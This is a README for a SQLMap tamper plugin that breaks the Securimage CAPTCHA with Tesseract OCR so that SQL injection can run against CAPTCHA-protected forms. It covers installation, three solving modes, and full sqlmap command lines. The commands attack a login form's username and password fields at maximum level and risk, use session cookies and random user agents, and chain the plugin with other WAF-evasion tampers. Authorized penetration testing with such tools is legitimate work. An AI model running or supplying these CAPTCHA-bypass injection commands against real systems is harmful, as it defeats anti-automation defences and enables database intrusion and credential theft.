## Securimage Tamper

SQLMap tamper for breaking securimage captcha!

# Installation

Ubuntu

```
sudo apt-get install tesseract-ocr-eng imagemagick catimg
```

```
pip install pytesseract
```

Put files into `sqlmap/tamper` or any related to sqlmap `tamper` folder

# Usages

Always make `--tamper` have spaces between `--tamper` and `securimage`. Examples: `--tamper securimage url_image params_captcha cookie_session tesseract_psm tesseract_oem tesseract_dpi tesseract_c(optional)`

## securimage tamper have 3 modes

- math

Automatically evaluate math expressions

- character

Manually input character

- easy

Automatically input easy recognize character

### Full Examples

```
sqlmap --url "http://examples.com/index.php" --data "username=a&password=a" --method POST --dbms=mysql --cookie "PHPSESSID=XXXXXXXXXXXXXXXXXXXXXXXXXXX" --level 5 --risk 3 --random-agent -v 3 --tamper secureimagecaptcha http://examples.com/securimage_show.php captcha_code "PHPSESSID=XXXXXXXXXXXXXXXXXXXXXXXXXX" "13 1 100 tessedit_char_whitelist=1234567890x-+"
```

### Examples With Another Tamper

```
sqlmap --url "http://examples.com/index.php" --data "username=a&password=a" --method POST --dbms=mysql --cookie "PHPSESSID=XXXXXXXXXXXXXXXXXXXXXXXXXXX" --level 5 --risk 3 --random-agent -v 3 --tamper=varnish,luanginx --tamper secureimagecaptcha http://examples.com/securimage_show.php captcha_code "PHPSESSID=XXXXXXXXXXXXXXXXXXXXXXXXXX" "13 1 100 tessedit_char_whitelist=1234567890x-+"
```
